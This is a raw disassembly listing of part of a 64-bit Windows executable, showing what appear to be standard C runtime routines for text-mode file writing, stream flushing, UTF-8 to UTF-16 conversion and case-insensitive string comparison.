   14000cb5c:	ff 15 c6 34 00 00    	call   *0x34c6(%rip)        # 0x140010028
   14000cb62:	85 c0                	test   %eax,%eax
   14000cb64:	0f 84 b2 00 00 00    	je     0x14000cc1c
   14000cb6a:	0f be 4d b8          	movsbl -0x48(%rbp),%ecx
   14000cb6e:	85 c9                	test   %ecx,%ecx
   14000cb70:	0f 84 83 00 00 00    	je     0x14000cbf9
   14000cb76:	83 e9 01             	sub    $0x1,%ecx
   14000cb79:	74 09                	je     0x14000cb84
   14000cb7b:	83 f9 01             	cmp    $0x1,%ecx
   14000cb7e:	0f 85 39 01 00 00    	jne    0x14000ccbd
   14000cb84:	4e 8d 24 36          	lea    (%rsi,%r14,1),%r12
   14000cb88:	48 89 7d c0          	mov    %rdi,-0x40(%rbp)
   14000cb8c:	4c 8b fe             	mov    %rsi,%r15
   14000cb8f:	49 3b f4             	cmp    %r12,%rsi
   14000cb92:	73 5c                	jae    0x14000cbf0
   14000cb94:	44 8b 75 c4          	mov    -0x3c(%rbp),%r14d
   14000cb98:	41 0f b7 07          	movzwl (%r15),%eax
   14000cb9c:	0f b7 c8             	movzwl %ax,%ecx
   14000cb9f:	66 89 45 b8          	mov    %ax,-0x48(%rbp)
   14000cba3:	e8 08 0b 00 00       	call   0x14000d6b0
   14000cba8:	0f b7 4d b8          	movzwl -0x48(%rbp),%ecx
   14000cbac:	66 3b c1             	cmp    %cx,%ax
   14000cbaf:	75 36                	jne    0x14000cbe7
   14000cbb1:	41 83 c6 02          	add    $0x2,%r14d
   14000cbb5:	44 89 75 c4          	mov    %r14d,-0x3c(%rbp)
   14000cbb9:	66 83 f9 0a          	cmp    $0xa,%cx
   14000cbbd:	75 1d                	jne    0x14000cbdc
   14000cbbf:	b9 0d 00 00 00       	mov    $0xd,%ecx
   14000cbc4:	e8 e7 0a 00 00       	call   0x14000d6b0
   14000cbc9:	b9 0d 00 00 00       	mov    $0xd,%ecx
   14000cbce:	66 3b c1             	cmp    %cx,%ax
   14000cbd1:	75 14                	jne    0x14000cbe7
   14000cbd3:	41 ff c6             	inc    %r14d
   14000cbd6:	44 89 75 c4          	mov    %r14d,-0x3c(%rbp)
   14000cbda:	ff c7                	inc    %edi
   14000cbdc:	49 83 c7 02          	add    $0x2,%r15
   14000cbe0:	4d 3b fc             	cmp    %r12,%r15
   14000cbe3:	73 0b                	jae    0x14000cbf0
   14000cbe5:	eb b1                	jmp    0x14000cb98
   14000cbe7:	ff 15 eb 34 00 00    	call   *0x34eb(%rip)        # 0x1400100d8
   14000cbed:	89 45 c0             	mov    %eax,-0x40(%rbp)
   14000cbf0:	4c 8b 65 e8          	mov    -0x18(%rbp),%r12
   14000cbf4:	e9 ba 00 00 00       	jmp    0x14000ccb3
   14000cbf9:	45 8b ce             	mov    %r14d,%r9d
   14000cbfc:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000cc01:	4c 8b c6             	mov    %rsi,%r8
   14000cc04:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   14000cc08:	41 8b d7             	mov    %r15d,%edx
   14000cc0b:	e8 08 f5 ff ff       	call   0x14000c118
   14000cc10:	f2 0f 10 00          	movsd  (%rax),%xmm0
   14000cc14:	8b 78 08             	mov    0x8(%rax),%edi
   14000cc17:	e9 9c 00 00 00       	jmp    0x14000ccb8
   14000cc1c:	48 8d 15 0d ea 00 00 	lea    0xea0d(%rip),%rdx        # 0x14001b630
   14000cc23:	4a 8b 0c e2          	mov    (%rdx,%r12,8),%rcx
   14000cc27:	42 38 7c e9 38       	cmp    %dil,0x38(%rcx,%r13,8)
   14000cc2c:	7d 52                	jge    0x14000cc80
   14000cc2e:	0f be 4d b8          	movsbl -0x48(%rbp),%ecx
   14000cc32:	85 c9                	test   %ecx,%ecx
   14000cc34:	74 36                	je     0x14000cc6c
   14000cc36:	83 e9 01             	sub    $0x1,%ecx
   14000cc39:	74 1d                	je     0x14000cc58
   14000cc3b:	83 f9 01             	cmp    $0x1,%ecx
   14000cc3e:	0f 85 80 00 00 00    	jne    0x14000ccc4
   14000cc44:	45 8b ce             	mov    %r14d,%r9d
   14000cc47:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   14000cc4b:	4c 8b c6             	mov    %rsi,%r8
   14000cc4e:	41 8b d7             	mov    %r15d,%edx
   14000cc51:	e8 3e fa ff ff       	call   0x14000c694
   14000cc56:	eb b8                	jmp    0x14000cc10
   14000cc58:	45 8b ce             	mov    %r14d,%r9d
   14000cc5b:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   14000cc5f:	4c 8b c6             	mov    %rsi,%r8
   14000cc62:	41 8b d7             	mov    %r15d,%edx
   14000cc65:	e8 46 fb ff ff       	call   0x14000c7b0
   14000cc6a:	eb a4                	jmp    0x14000cc10
   14000cc6c:	45 8b ce             	mov    %r14d,%r9d
   14000cc6f:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   14000cc73:	4c 8b c6             	mov    %rsi,%r8
   14000cc76:	41 8b d7             	mov    %r15d,%edx
   14000cc79:	e8 12 f9 ff ff       	call   0x14000c590
   14000cc7e:	eb 90                	jmp    0x14000cc10
   14000cc80:	4a 8b 4c e9 28       	mov    0x28(%rcx,%r13,8),%rcx
   14000cc85:	4c 8d 4d c4          	lea    -0x3c(%rbp),%r9
   14000cc89:	33 c0                	xor    %eax,%eax
   14000cc8b:	45 8b c6             	mov    %r14d,%r8d
   14000cc8e:	48 21 44 24 20       	and    %rax,0x20(%rsp)
   14000cc93:	48 8b d6             	mov    %rsi,%rdx
   14000cc96:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
   14000cc9a:	89 45 c8             	mov    %eax,-0x38(%rbp)
   14000cc9d:	ff 15 bd 34 00 00    	call   *0x34bd(%rip)        # 0x140010160
   14000cca3:	85 c0                	test   %eax,%eax
   14000cca5:	75 09                	jne    0x14000ccb0
   14000cca7:	ff 15 2b 34 00 00    	call   *0x342b(%rip)        # 0x1400100d8
   14000ccad:	89 45 c0             	mov    %eax,-0x40(%rbp)
   14000ccb0:	8b 7d c8             	mov    -0x38(%rbp),%edi
   14000ccb3:	f2 0f 10 45 c0       	movsd  -0x40(%rbp),%xmm0
   14000ccb8:	f2 0f 11 45 d0       	movsd  %xmm0,-0x30(%rbp)
   14000ccbd:	48 8d 15 6c e9 00 00 	lea    0xe96c(%rip),%rdx        # 0x14001b630
   14000ccc4:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
   14000ccc8:	48 c1 e8 20          	shr    $0x20,%rax
   14000cccc:	85 c0                	test   %eax,%eax
   14000ccce:	75 5c                	jne    0x14000cd2c
   14000ccd0:	8b 45 d0             	mov    -0x30(%rbp),%eax
   14000ccd3:	85 c0                	test   %eax,%eax
   14000ccd5:	74 2c                	je     0x14000cd03
   14000ccd7:	83 f8 05             	cmp    $0x5,%eax
   14000ccda:	75 17                	jne    0x14000ccf3
   14000ccdc:	c6 43 30 01          	movb   $0x1,0x30(%rbx)
   14000cce0:	c7 43 2c 09 00 00 00 	movl   $0x9,0x2c(%rbx)
   14000cce7:	c6 43 38 01          	movb   $0x1,0x38(%rbx)
   14000cceb:	89 43 34             	mov    %eax,0x34(%rbx)
   14000ccee:	e9 ac fd ff ff       	jmp    0x14000ca9f
   14000ccf3:	8b 4d d0             	mov    -0x30(%rbp),%ecx
   14000ccf6:	48 8b d3             	mov    %rbx,%rdx
   14000ccf9:	e8 72 9e ff ff       	call   0x140006b70
   14000ccfe:	e9 9c fd ff ff       	jmp    0x14000ca9f
   14000cd03:	4a 8b 04 e2          	mov    (%rdx,%r12,8),%rax
   14000cd07:	42 f6 44 e8 38 40    	testb  $0x40,0x38(%rax,%r13,8)
   14000cd0d:	74 05                	je     0x14000cd14
   14000cd0f:	80 3e 1a             	cmpb   $0x1a,(%rsi)
   14000cd12:	74 1f                	je     0x14000cd33
   14000cd14:	83 63 34 00          	andl   $0x0,0x34(%rbx)
   14000cd18:	c6 43 30 01          	movb   $0x1,0x30(%rbx)
   14000cd1c:	c7 43 2c 1c 00 00 00 	movl   $0x1c,0x2c(%rbx)
   14000cd23:	c6 43 38 01          	movb   $0x1,0x38(%rbx)
   14000cd27:	e9 73 fd ff ff       	jmp    0x14000ca9f
   14000cd2c:	8b 45 d4             	mov    -0x2c(%rbp),%eax
   14000cd2f:	2b c7                	sub    %edi,%eax
   14000cd31:	eb 02                	jmp    0x14000cd35
   14000cd33:	33 c0                	xor    %eax,%eax
   14000cd35:	48 83 c4 78          	add    $0x78,%rsp
   14000cd39:	41 5f                	pop    %r15
   14000cd3b:	41 5e                	pop    %r14
   14000cd3d:	41 5d                	pop    %r13
   14000cd3f:	41 5c                	pop    %r12
   14000cd41:	5f                   	pop    %rdi
   14000cd42:	5e                   	pop    %rsi
   14000cd43:	5b                   	pop    %rbx
   14000cd44:	5d                   	pop    %rbp
   14000cd45:	c3                   	ret
   14000cd46:	cc                   	int3
   14000cd47:	cc                   	int3
   14000cd48:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   14000cd4d:	57                   	push   %rdi
   14000cd4e:	48 83 ec 30          	sub    $0x30,%rsp
   14000cd52:	83 64 24 20 00       	andl   $0x0,0x20(%rsp)
   14000cd57:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000cd5c:	e8 0b bf ff ff       	call   0x140008c6c
   14000cd61:	90                   	nop
   14000cd62:	bb 03 00 00 00       	mov    $0x3,%ebx
   14000cd67:	89 5c 24 24          	mov    %ebx,0x24(%rsp)
   14000cd6b:	3b 1d af ee 00 00    	cmp    0xeeaf(%rip),%ebx        # 0x14001bc20
   14000cd71:	74 6e                	je     0x14000cde1
   14000cd73:	48 63 fb             	movslq %ebx,%rdi
   14000cd76:	48 8b 05 ab ee 00 00 	mov    0xeeab(%rip),%rax        # 0x14001bc28
   14000cd7d:	48 8b 0c f8          	mov    (%rax,%rdi,8),%rcx
   14000cd81:	48 85 c9             	test   %rcx,%rcx
   14000cd84:	75 02                	jne    0x14000cd88
   14000cd86:	eb 55                	jmp    0x14000cddd
   14000cd88:	8b 41 14             	mov    0x14(%rcx),%eax
   14000cd8b:	90                   	nop
   14000cd8c:	c1 e8 0d             	shr    $0xd,%eax
   14000cd8f:	24 01                	and    $0x1,%al
   14000cd91:	74 19                	je     0x14000cdac
   14000cd93:	48 8b 0d 8e ee 00 00 	mov    0xee8e(%rip),%rcx        # 0x14001bc28
   14000cd9a:	48 8b 0c f9          	mov    (%rcx,%rdi,8),%rcx
   14000cd9e:	e8 6d 0a 00 00       	call   0x14000d810
   14000cda3:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000cda6:	74 04                	je     0x14000cdac
   14000cda8:	ff 44 24 20          	incl   0x20(%rsp)
   14000cdac:	48 8b 05 75 ee 00 00 	mov    0xee75(%rip),%rax        # 0x14001bc28
   14000cdb3:	48 8b 0c f8          	mov    (%rax,%rdi,8),%rcx
   14000cdb7:	48 83 c1 30          	add    $0x30,%rcx
   14000cdbb:	ff 15 37 33 00 00    	call   *0x3337(%rip)        # 0x1400100f8
   14000cdc1:	48 8b 0d 60 ee 00 00 	mov    0xee60(%rip),%rcx        # 0x14001bc28
   14000cdc8:	48 8b 0c f9          	mov    (%rcx,%rdi,8),%rcx
   14000cdcc:	e8 7b 9e ff ff       	call   0x140006c4c
   14000cdd1:	48 8b 05 50 ee 00 00 	mov    0xee50(%rip),%rax        # 0x14001bc28
   14000cdd8:	48 83 24 f8 00       	andq   $0x0,(%rax,%rdi,8)
   14000cddd:	ff c3                	inc    %ebx
   14000cddf:	eb 86                	jmp    0x14000cd67
   14000cde1:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000cde6:	e8 d5 be ff ff       	call   0x140008cc0
   14000cdeb:	8b 44 24 20          	mov    0x20(%rsp),%eax
   14000cdef:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   14000cdf4:	48 83 c4 30          	add    $0x30,%rsp
   14000cdf8:	5f                   	pop    %rdi
   14000cdf9:	c3                   	ret
   14000cdfa:	cc                   	int3
   14000cdfb:	cc                   	int3
   14000cdfc:	40 53                	rex push %rbx
   14000cdfe:	48 83 ec 20          	sub    $0x20,%rsp
   14000ce02:	8b 41 14             	mov    0x14(%rcx),%eax
   14000ce05:	48 8b d9             	mov    %rcx,%rbx
   14000ce08:	c1 e8 0d             	shr    $0xd,%eax
   14000ce0b:	90                   	nop
   14000ce0c:	a8 01                	test   $0x1,%al
   14000ce0e:	74 28                	je     0x14000ce38
   14000ce10:	8b 41 14             	mov    0x14(%rcx),%eax
   14000ce13:	90                   	nop
   14000ce14:	c1 e8 06             	shr    $0x6,%eax
   14000ce17:	a8 01                	test   $0x1,%al
   14000ce19:	74 1d                	je     0x14000ce38
   14000ce1b:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   14000ce1f:	e8 28 9e ff ff       	call   0x140006c4c
   14000ce24:	f0 81 63 14 bf fe ff 	lock andl $0xfffffebf,0x14(%rbx)
   14000ce2b:	ff 
   14000ce2c:	33 c0                	xor    %eax,%eax
   14000ce2e:	48 89 43 08          	mov    %rax,0x8(%rbx)
   14000ce32:	48 89 03             	mov    %rax,(%rbx)
   14000ce35:	89 43 10             	mov    %eax,0x10(%rbx)
   14000ce38:	48 83 c4 20          	add    $0x20,%rsp
   14000ce3c:	5b                   	pop    %rbx
   14000ce3d:	c3                   	ret
   14000ce3e:	cc                   	int3
   14000ce3f:	cc                   	int3
   14000ce40:	48 83 ec 28          	sub    $0x28,%rsp
   14000ce44:	83 f9 fe             	cmp    $0xfffffffe,%ecx
   14000ce47:	75 0d                	jne    0x14000ce56
   14000ce49:	e8 66 9d ff ff       	call   0x140006bb4
   14000ce4e:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000ce54:	eb 42                	jmp    0x14000ce98
   14000ce56:	85 c9                	test   %ecx,%ecx
   14000ce58:	78 2e                	js     0x14000ce88
   14000ce5a:	3b 0d d0 eb 00 00    	cmp    0xebd0(%rip),%ecx        # 0x14001ba30
   14000ce60:	73 26                	jae    0x14000ce88
   14000ce62:	48 63 c9             	movslq %ecx,%rcx
   14000ce65:	48 8d 15 c4 e7 00 00 	lea    0xe7c4(%rip),%rdx        # 0x14001b630
   14000ce6c:	48 8b c1             	mov    %rcx,%rax
   14000ce6f:	83 e1 3f             	and    $0x3f,%ecx
   14000ce72:	48 c1 e8 06          	shr    $0x6,%rax
   14000ce76:	48 8d 0c c9          	lea    (%rcx,%rcx,8),%rcx
   14000ce7a:	48 8b 04 c2          	mov    (%rdx,%rax,8),%rax
   14000ce7e:	0f b6 44 c8 38       	movzbl 0x38(%rax,%rcx,8),%eax
   14000ce83:	83 e0 40             	and    $0x40,%eax
   14000ce86:	eb 12                	jmp    0x14000ce9a
   14000ce88:	e8 27 9d ff ff       	call   0x140006bb4
   14000ce8d:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000ce93:	e8 e0 9b ff ff       	call   0x140006a78
   14000ce98:	33 c0                	xor    %eax,%eax
   14000ce9a:	48 83 c4 28          	add    $0x28,%rsp
   14000ce9e:	c3                   	ret
   14000ce9f:	cc                   	int3
   14000cea0:	40 53                	rex push %rbx
   14000cea2:	48 83 ec 40          	sub    $0x40,%rsp
   14000cea6:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   14000ceab:	48 8b d9             	mov    %rcx,%rbx
   14000ceae:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000ceb3:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000ceb8:	e8 bb 0f 00 00       	call   0x14000de78
   14000cebd:	48 83 f8 04          	cmp    $0x4,%rax
   14000cec1:	77 1a                	ja     0x14000cedd
   14000cec3:	8b 54 24 30          	mov    0x30(%rsp),%edx
   14000cec7:	b9 fd ff 00 00       	mov    $0xfffd,%ecx
   14000cecc:	81 fa ff ff 00 00    	cmp    $0xffff,%edx
   14000ced2:	0f 47 d1             	cmova  %ecx,%edx
   14000ced5:	48 85 db             	test   %rbx,%rbx
   14000ced8:	74 03                	je     0x14000cedd
   14000ceda:	66 89 13             	mov    %dx,(%rbx)
   14000cedd:	48 83 c4 40          	add    $0x40,%rsp
   14000cee1:	5b                   	pop    %rbx
   14000cee2:	c3                   	ret
   14000cee3:	cc                   	int3
   14000cee4:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   14000cee9:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   14000ceee:	57                   	push   %rdi
   14000ceef:	41 54                	push   %r12
   14000cef1:	41 55                	push   %r13
   14000cef3:	41 56                	push   %r14
   14000cef5:	41 57                	push   %r15
   14000cef7:	48 83 ec 30          	sub    $0x30,%rsp
   14000cefb:	48 8b 3a             	mov    (%rdx),%rdi
   14000cefe:	33 c0                	xor    %eax,%eax
   14000cf00:	4d 8b e1             	mov    %r9,%r12
   14000cf03:	49 8b e8             	mov    %r8,%rbp
   14000cf06:	4c 8b fa             	mov    %rdx,%r15
   14000cf09:	4c 8b f1             	mov    %rcx,%r14
   14000cf0c:	48 85 c9             	test   %rcx,%rcx
   14000cf0f:	0f 84 e7 00 00 00    	je     0x14000cffc
   14000cf15:	48 8b d9             	mov    %rcx,%rbx
   14000cf18:	4d 85 c0             	test   %r8,%r8
   14000cf1b:	0f 84 b0 00 00 00    	je     0x14000cfd1
   14000cf21:	4c 8b ac 24 80 00 00 	mov    0x80(%rsp),%r13
   14000cf28:	00 
   14000cf29:	38 07                	cmp    %al,(%rdi)
   14000cf2b:	75 08                	jne    0x14000cf35
   14000cf2d:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000cf33:	eb 1c                	jmp    0x14000cf51
   14000cf35:	38 47 01             	cmp    %al,0x1(%rdi)
   14000cf38:	75 08                	jne    0x14000cf42
   14000cf3a:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000cf40:	eb 0f                	jmp    0x14000cf51
   14000cf42:	8a 47 02             	mov    0x2(%rdi),%al
   14000cf45:	f6 d8                	neg    %al
   14000cf47:	4d 1b c0             	sbb    %r8,%r8
   14000cf4a:	49 f7 d8             	neg    %r8
   14000cf4d:	49 83 c0 03          	add    $0x3,%r8
   14000cf51:	4d 8b cc             	mov    %r12,%r9
   14000cf54:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   14000cf59:	48 8b d7             	mov    %rdi,%rdx
   14000cf5c:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   14000cf61:	e8 12 0f 00 00       	call   0x14000de78
   14000cf66:	48 8b d0             	mov    %rax,%rdx
   14000cf69:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000cf6d:	74 7b                	je     0x14000cfea
   14000cf6f:	33 c0                	xor    %eax,%eax
   14000cf71:	48 85 d2             	test   %rdx,%rdx
   14000cf74:	74 6c                	je     0x14000cfe2
   14000cf76:	8b 4c 24 60          	mov    0x60(%rsp),%ecx
   14000cf7a:	81 f9 ff ff 00 00    	cmp    $0xffff,%ecx
   14000cf80:	76 3b                	jbe    0x14000cfbd
   14000cf82:	48 83 fd 01          	cmp    $0x1,%rbp
   14000cf86:	76 49                	jbe    0x14000cfd1
   14000cf88:	81 c1 00 00 ff ff    	add    $0xffff0000,%ecx
   14000cf8e:	41 b8 00 d8 00 00    	mov    $0xd800,%r8d
   14000cf94:	8b c1                	mov    %ecx,%eax
   14000cf96:	89 4c 24 60          	mov    %ecx,0x60(%rsp)
   14000cf9a:	c1 e8 0a             	shr    $0xa,%eax
   14000cf9d:	48 ff cd             	dec    %rbp
   14000cfa0:	66 41 0b c0          	or     %r8w,%ax
   14000cfa4:	66 89 03             	mov    %ax,(%rbx)
   14000cfa7:	b8 ff 03 00 00       	mov    $0x3ff,%eax
   14000cfac:	66 23 c8             	and    %ax,%cx
   14000cfaf:	48 83 c3 02          	add    $0x2,%rbx
   14000cfb3:	b8 00 dc 00 00       	mov    $0xdc00,%eax
   14000cfb8:	66 0b c8             	or     %ax,%cx
   14000cfbb:	33 c0                	xor    %eax,%eax
   14000cfbd:	66 89 0b             	mov    %cx,(%rbx)
   14000cfc0:	48 03 fa             	add    %rdx,%rdi
   14000cfc3:	48 83 c3 02          	add    $0x2,%rbx
   14000cfc7:	48 83 ed 01          	sub    $0x1,%rbp
   14000cfcb:	0f 85 58 ff ff ff    	jne    0x14000cf29
   14000cfd1:	49 2b de             	sub    %r14,%rbx
   14000cfd4:	49 89 3f             	mov    %rdi,(%r15)
   14000cfd7:	48 d1 fb             	sar    $1,%rbx
   14000cfda:	48 8b c3             	mov    %rbx,%rax
   14000cfdd:	e9 8c 00 00 00       	jmp    0x14000d06e
   14000cfe2:	48 8b f8             	mov    %rax,%rdi
   14000cfe5:	66 89 03             	mov    %ax,(%rbx)
   14000cfe8:	eb e7                	jmp    0x14000cfd1
   14000cfea:	49 89 3f             	mov    %rdi,(%r15)
   14000cfed:	41 c6 45 30 01       	movb   $0x1,0x30(%r13)
   14000cff2:	41 c7 45 2c 2a 00 00 	movl   $0x2a,0x2c(%r13)
   14000cff9:	00 
   14000cffa:	eb 6e                	jmp    0x14000d06a
   14000cffc:	48 8b ac 24 80 00 00 	mov    0x80(%rsp),%rbp
   14000d003:	00 
   14000d004:	48 8b d8             	mov    %rax,%rbx
   14000d007:	38 07                	cmp    %al,(%rdi)
   14000d009:	75 08                	jne    0x14000d013
   14000d00b:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000d011:	eb 1c                	jmp    0x14000d02f
   14000d013:	38 47 01             	cmp    %al,0x1(%rdi)
   14000d016:	75 08                	jne    0x14000d020
   14000d018:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000d01e:	eb 0f                	jmp    0x14000d02f
   14000d020:	8a 47 02             	mov    0x2(%rdi),%al
   14000d023:	f6 d8                	neg    %al
   14000d025:	4d 1b c0             	sbb    %r8,%r8
   14000d028:	49 f7 d8             	neg    %r8
   14000d02b:	49 83 c0 03          	add    $0x3,%r8
   14000d02f:	4d 8b cc             	mov    %r12,%r9
   14000d032:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   14000d037:	48 8b d7             	mov    %rdi,%rdx
   14000d03a:	33 c9                	xor    %ecx,%ecx
   14000d03c:	e8 37 0e 00 00       	call   0x14000de78
   14000d041:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000d045:	74 18                	je     0x14000d05f
   14000d047:	48 85 c0             	test   %rax,%rax
   14000d04a:	74 8e                	je     0x14000cfda
   14000d04c:	48 83 f8 04          	cmp    $0x4,%rax
   14000d050:	75 03                	jne    0x14000d055
   14000d052:	48 ff c3             	inc    %rbx
   14000d055:	48 03 f8             	add    %rax,%rdi
   14000d058:	48 ff c3             	inc    %rbx
   14000d05b:	33 c0                	xor    %eax,%eax
   14000d05d:	eb a8                	jmp    0x14000d007
   14000d05f:	c6 45 30 01          	movb   $0x1,0x30(%rbp)
   14000d063:	c7 45 2c 2a 00 00 00 	movl   $0x2a,0x2c(%rbp)
   14000d06a:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000d06e:	48 8b 5c 24 68       	mov    0x68(%rsp),%rbx
   14000d073:	48 8b 6c 24 70       	mov    0x70(%rsp),%rbp
   14000d078:	48 83 c4 30          	add    $0x30,%rsp
   14000d07c:	41 5f                	pop    %r15
   14000d07e:	41 5e                	pop    %r14
   14000d080:	41 5d                	pop    %r13
   14000d082:	41 5c                	pop    %r12
   14000d084:	5f                   	pop    %rdi
   14000d085:	c3                   	ret
   14000d086:	cc                   	int3
   14000d087:	cc                   	int3
   14000d088:	33 c0                	xor    %eax,%eax
   14000d08a:	38 01                	cmp    %al,(%rcx)
   14000d08c:	74 0e                	je     0x14000d09c
   14000d08e:	48 3b c2             	cmp    %rdx,%rax
   14000d091:	74 09                	je     0x14000d09c
   14000d093:	48 ff c0             	inc    %rax
   14000d096:	80 3c 08 00          	cmpb   $0x0,(%rax,%rcx,1)
   14000d09a:	75 f2                	jne    0x14000d08e
   14000d09c:	c3                   	ret
   14000d09d:	cc                   	int3
   14000d09e:	cc                   	int3
   14000d09f:	cc                   	int3
   14000d0a0:	4c 8b da             	mov    %rdx,%r11
   14000d0a3:	4c 8b d1             	mov    %rcx,%r10
   14000d0a6:	4d 85 c0             	test   %r8,%r8
   14000d0a9:	75 03                	jne    0x14000d0ae
   14000d0ab:	33 c0                	xor    %eax,%eax
   14000d0ad:	c3                   	ret
   14000d0ae:	41 0f b6 0a          	movzbl (%r10),%ecx
   14000d0b2:	49 ff c2             	inc    %r10
   14000d0b5:	41 0f b6 13          	movzbl (%r11),%edx
   14000d0b9:	8d 41 bf             	lea    -0x41(%rcx),%eax
   14000d0bc:	83 f8 19             	cmp    $0x19,%eax
   14000d0bf:	44 8d 49 20          	lea    0x20(%rcx),%r9d
   14000d0c3:	8d 42 bf             	lea    -0x41(%rdx),%eax
   14000d0c6:	44 0f 47 c9          	cmova  %ecx,%r9d
   14000d0ca:	49 ff c3             	inc    %r11
   14000d0cd:	83 f8 19             	cmp    $0x19,%eax
   14000d0d0:	8d 4a 20             	lea    0x20(%rdx),%ecx
   14000d0d3:	41 8b c1             	mov    %r9d,%eax
   14000d0d6:	0f 47 ca             	cmova  %edx,%ecx
   14000d0d9:	2b c1                	sub    %ecx,%eax
   14000d0db:	75 0b                	jne    0x14000d0e8
   14000d0dd:	45 85 c9             	test   %r9d,%r9d
   14000d0e0:	74 06                	je     0x14000d0e8
   14000d0e2:	49 83 e8 01          	sub    $0x1,%r8
   14000d0e6:	75 c6                	jne    0x14000d0ae
   14000d0e8:	c3                   	ret
   14000d0e9:	cc                   	int3
   14000d0ea:	cc                   	int3
   14000d0eb:	cc                   	int3
   14000d0ec:	48 83 ec 28          	sub    $0x28,%rsp
   14000d0f0:	83 3d 89 e2 00 00 00 	cmpl   $0x0,0xe289(%rip)        # 0x14001b380
   14000d0f7:	75 36                	jne    0x14000d12f
   14000d0f9:	48 85 c9             	test   %rcx,%rcx
   14000d0fc:	75 1a                	jne    0x14000d118
   14000d0fe:	e8 b1 9a ff ff       	call   0x140006bb4
   14000d103:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000d109:	e8 6a 99 ff ff       	call   0x140006a78
   14000d10e:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
   14000d113:	48 83 c4 28          	add    $0x28,%rsp
   14000d117:	c3                   	ret
   14000d118:	48 85 d2             	test   %rdx,%rdx
   14000d11b:	74 e1                	je     0x14000d0fe
   14000d11d:	49 81 f8 ff ff ff 7f 	cmp    $0x7fffffff,%r8
   14000d124:	77 d8                	ja     0x14000d0fe
   14000d126:	48 83 c4 28          	add    $0x28,%rsp
   14000d12a:	e9 71 ff ff ff       	jmp    0x14000d0a0
   14000d12f:	45 33 c9             	xor    %r9d,%r9d
   14000d132:	48 83 c4 28          	add    $0x28,%rsp
   14000d136:	e9 01 00 00 00       	jmp    0x14000d13c
   14000d13b:	cc                   	int3
   14000d13c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000d141:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000d146:	57                   	push   %rdi
   14000d147:	48 83 ec 40          	sub    $0x40,%rsp
   14000d14b:	49 8b d8             	mov    %r8,%rbx
   14000d14e:	48 8b fa             	mov    %rdx,%rdi
   14000d151:	48 8b f1             	mov    %rcx,%rsi
   14000d154:	48 85 c9             	test   %rcx,%rcx
   14000d157:	75 17                	jne    0x14000d170
   14000d159:	e8 56 9a ff ff       	call   0x140006bb4
   14000d15e:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000d164:	e8 0f 99 ff ff       	call   0x140006a78
   14000d169:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
   14000d16e:	eb 69                	jmp    0x14000d1d9
   14000d170:	48 85 d2             	test   %rdx,%rdx
   14000d173:	74 e4                	je     0x14000d159
   14000d175:	48 81 fb ff ff ff 7f 	cmp    $0x7fffffff,%rbx
   14000d17c:	77 db                	ja     0x14000d159
   14000d17e:	48 85 db             	test   %rbx,%rbx
   14000d181:	75 04                	jne    0x14000d187
   14000d183:	33 c0                	xor    %eax,%eax
   14000d185:	eb 52                	jmp    0x14000d1d9
   14000d187:	49 8b d1             	mov    %r9,%rdx
   14000d18a:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000d18f:	e8 28 a5 ff ff       	call   0x1400076bc
   14000d194:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   14000d199:	4c 8b 80 10 01 00 00 	mov    0x110(%rax),%r8
   14000d1a0:	0f b6 06             	movzbl (%rsi),%eax
   14000d1a3:	48 ff c6             	inc    %rsi
   14000d1a6:	42 0f b6 14 00       	movzbl (%rax,%r8,1),%edx
   14000d1ab:	0f b6 07             	movzbl (%rdi),%eax
   14000d1ae:	48 ff c7             	inc    %rdi
   14000d1b1:	42 0f b6 0c 00       	movzbl (%rax,%r8,1),%ecx
   14000d1b6:	8b c2                	mov    %edx,%eax
   14000d1b8:	2b c1                	sub    %ecx,%eax
   14000d1ba:	75 0a                	jne    0x14000d1c6
   14000d1bc:	85 d2                	test   %edx,%edx
   14000d1be:	74 06                	je     0x14000d1c6
   14000d1c0:	48 83 eb 01          	sub    $0x1,%rbx
   14000d1c4:	75 da                	jne    0x14000d1a0
   14000d1c6:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   14000d1cb:	74 0c                	je     0x14000d1d9
   14000d1cd:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   14000d1d2:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   14000d1d9:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   14000d1de:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
